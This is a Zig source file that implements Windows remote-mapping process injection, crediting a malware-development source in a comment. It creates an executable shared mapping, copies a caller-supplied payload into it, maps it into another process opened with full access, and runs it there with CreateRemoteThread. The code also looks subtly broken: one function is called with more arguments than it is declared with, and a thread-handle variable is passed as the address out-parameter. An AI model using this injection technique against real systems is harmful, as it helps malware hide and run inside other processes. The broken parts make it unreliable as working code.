const std = @import("std");
const windows = std.os.windows;
//const WINAPI = windows.WINAPI;
const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const LPVOID = windows.LPVOID;
const BOOL = windows.BOOL;
const kernel32 = windows.kernel32;
const INVALID_HANDLE_VALUE = windows.INVALID_HANDLE_VALUE;
const FILE_MAP_WRITE = 0x0002;
const FILE_MAP_EXECUTE = 0x0020;
const LPTHREAD_START_ROUTINE = windows.LPTHREAD_START_ROUTINE;
const LPSECURITY_ATTRIBUTES = *windows.SECURITY_ATTRIBUTES;
const SIZE_T = windows.SIZE_T;
const LPDWORD = *windows.DWORD;
const PROCESS_ALL_ACCESS = 0x000F0000 | (0x00100000) | 0xFFFF;

const NUMA_NO_PREFERRED_NODE: u32 = 0xffffffff;


extern "kernel32" fn CreateRemoteThread(hProcess: HANDLE, lpThreadAttributes: ?LPSECURITY_ATTRIBUTES, dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: ?LPVOID, dwCreationFlags: DWORD, lpThreadId: ?LPDWORD) callconv(.winapi) ?HANDLE;

extern "kernel32" fn OpenProcess(
    dwDesiredAccess: windows.DWORD,
    bInheritHandle: windows.BOOL,
    dwProcessId: windows.DWORD,
) callconv(.winapi) windows.HANDLE;

extern "kernel32" fn CreateFileMappingW(
    hFile: windows.HANDLE,
    lpFileMappingAttributes: ?*anyopaque,
    flProtect: windows.DWORD,
    dwMaximumSizeHigh: windows.DWORD,
    dwMaximumSizeLow: windows.DWORD,
    lpName: ?[*:0]const u16,
) callconv(.winapi) ?windows.HANDLE;


extern "kernel32" fn MapViewOfFile(
    hFileMappingObject: windows.HANDLE,
    dwDesiredAccess: windows.DWORD,
    dwFileOffsetHigh: windows.DWORD,
    dwFileOffsetLow: windows.DWORD,
    dwNumberOfBytesToMap: windows.SIZE_T,
) callconv(.winapi) ?*anyopaque;

extern "kernel32" fn GetModuleHandleA(
    lpModuleName: ?[*:0]const u8,
) callconv(.winapi) ?windows.HMODULE;

extern "kernel32" fn GetProcAddress(
    hModule: windows.HMODULE,
    lpProcName: [*:0]const u8,
) callconv(.winapi) ?*anyopaque;

//extern "kernel32" fn MapViewOfFile2(FileMappingHandle: HANDLE, ProcessHandle: HANDLE, Offset: windows.ULONG64, BaseAddress: ?*anyopaque, ViewSize: windows.SIZE_T, AllocationType: windows.ULONG, PageProtection: windows.ULONG) callconv(.winapi) ?*anyopaque;
//extern "kernel32" fn MapViewOfFile2(
 //   FileMappingHandle: windows.HANDLE,
 //   ProcessHandle: windows.HANDLE,
  //  Offset: u64,
   // BaseAddress: ?*anyopaque,
    //ViewSize: usize,
   // AllocationType: u32,
   // PageProtection: u32,
//) //callconv(.winapi) ?*anyopaque;



//extern "kernel32" fn MapViewOfFile2(
//    FileMappingHandle: std.os.windows.HANDLE, 
//    ProcessHandle: std.os.windows.HANDLE, 
//    Offset: u64, 
//    BaseAddress: ?*anyopaque, 
 //   ViewSize: usize, 
  //  AllocationType: u32, 
   // PageProtection: u32,
   // ) callconv(.winapi) ?*anyopaque; 

extern "kernel32" fn MapViewOfFile2(FileMappingHandle: std.os.windows.HANDLE, ProcessHandle: std.os.windows.HANDLE, Offset: u64, BaseAddress: ?*anyopaque, ViewSize: usize, AllocationType: u32, PageProtection: u32) callconv(.winapi) ?*anyopaque;
//extern "kernel32" fn MapViewOfFileEx(
//    hFileMappingObject: ?windows.HANDLE,
 //   dwDesiredAccess: windows.DWORD,
  //  dwFileOffsetHigh: windows.DWORD,
   // dwFileOffsetLow: windows.DWORD,
    //dwNumberOfBytesToMap: windows.SIZE_T,
   // lpBaseAddress: ?*anyopaque,
//) callconv(.winapi) ?*anyopaque;


const MapViewOfFile2Type = *const fn(
windows.HANDLE, 
windows.HANDLE, 
u64,
?*anyopaque, 
usize, 
u32,
u32,
) callconv(.winapi) ?*anyopaque; 


pub extern "Api-ms-win-core-memory-l1-1-5" fn MapViewOfFileNuma2(
    FileMappingHandle: HANDLE,
    ProcessHandle: HANDLE,
    Offset: u64, // ULONG64
    BaseAddress: ?*anyopaque, // PVOID (optional)
    ViewSize: usize, // SIZE_T
    AllocationType: u32, // ULONG
    PageProtection: u32, // ULONG
) callconv(.winapi) ?*anyopaque; // Returns PVOID
                                 //
                                 //
fn waitForEnter() !void {
    std.debug.print("Press Enter to continue...\n", .{});

    const stdin = std.fs.File.stdin();
    var buf: [1]u8 = undefined;

    // Read until newline
    while (true) {
        const n = try stdin.read(&buf);
        if (n == 0) break; // EOF
        if (buf[0] == '\n') break; // Enter pressed
    }
}

pub fn RemoteMappingInject(rhProcess: HANDLE, pPayload: [*]const u8, sPayloadSize: usize, ppAddress: *?*anyopaque) bool {
    // thanks to maldev!
    var Status: bool = true;
    var FileHandle: ?windows.HANDLE = undefined;
    var MapLocalAddress: ?*anyopaque = undefined;
    var MapRemoteAddress: ?*anyopaque = undefined;

    FileHandle = CreateFileMappingW(INVALID_HANDLE_VALUE, null, windows.PAGE_EXECUTE_READWRITE, 0, @intCast(sPayloadSize), null);
    if (FileHandle == null) {
        std.debug.print("CreateFileMappingW failed: {}\n", .{kernel32.GetLastError()});
        return false;
    }
    MapLocalAddress = MapViewOfFile(FileHandle.?, FILE_MAP_WRITE, 0, 0, @intCast(sPayloadSize));
    if (MapLocalAddress == null) {
        std.debug.print("MapViewOfFile failed: {}\n", .{kernel32.GetLastError()});
        return false;
    }

    @memcpy(@as([*]u8, @ptrCast(MapLocalAddress)), pPayload[0..sPayloadSize]);

    std.debug.print("MapLocalAddress: 0x{x}\n", .{@intFromPtr(MapLocalAddress)});


    // _ = MapViewOfFile2; 

  //const kernel32_handle = GetModuleHandleA("kernel32.dll");
   // if (kernel32_handle) |handle| {
    //  std.debug.print("getting kernel32.dll handle", .{}); 

//    const MapViewOfFile2_ptr = GetProcAddress(handle, "MapViewOfFile2");
 //   if (MapViewOfFile2_ptr) |func_ptr| {

//        const MapViewOfFile2_func = @as(MapViewOfFile2Type,@ptrCast(func_ptr)); 

        // Use the function pointer
  //       MapRemoteAddress = MapViewOfFile2_func(
    //        FileHandle.?,
      //      rhProcess,
        //    0,
          //  null,
      //      @intCast(sPayloadSize),
   //         0,
    //        windows.PAGE_EXECUTE_READWRITE
     //   );
   // }else{ 

   // std.debug.print("failed to resolve that call", .{}); 

   // }
//}



   MapRemoteAddress = MapViewOfFileNuma2(FileHandle.?, rhProcess, 0, null, 0, 0, windows.PAGE_EXECUTE_READWRITE,NUMA_NO_PREFERRED_NODE);
    std.debug.print("MapRemoteAddress: 0x{x}\n", .{@intFromPtr(MapRemoteAddress)});

    if (MapRemoteAddress != null) {
        ppAddress.* = MapRemoteAddress;
        Status = true;
    }
    return Status;
}

pub fn Inject_CreateRemoteThread(ProcessId: windows.DWORD, pPayload: [*]const u8, sPayloadSize: usize) bool {
    //var hProcess: HANDLE = undefined;
    var hThread: ?HANDLE = undefined;
    var is_ok: bool = false;
    //var tThread: HANDLE = undefined;
    //var lpThreadId: windows.DWORD = undefined;

    const hProcess = OpenProcess(PROCESS_ALL_ACCESS, windows.FALSE, ProcessId);

    if (hProcess == INVALID_HANDLE_VALUE) {
        return false;
    } else {
        is_ok = RemoteMappingInject(hProcess, pPayload, sPayloadSize, &hThread);
        if (!is_ok) {
            std.debug.print("RemoteMappingInject failed: {}\n", .{is_ok});
            return false; 
        }
    }


//LPTHREAD_START_ROUTINE
      const Adr = @as(LPTHREAD_START_ROUTINE, @ptrCast(hThread)); 
     // 
    //hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
    

     _ = waitForEnter() catch {};  

    const tThread = CreateRemoteThread(hProcess, null, 0, Adr, null, 0, null);
    if (tThread == INVALID_HANDLE_VALUE) {
        return false;
    } else {
        // windows.WaitForSingleObject(hThread, windows.INFINITE);
        windows.CloseHandle(tThread.?);
    }

    return true;
}

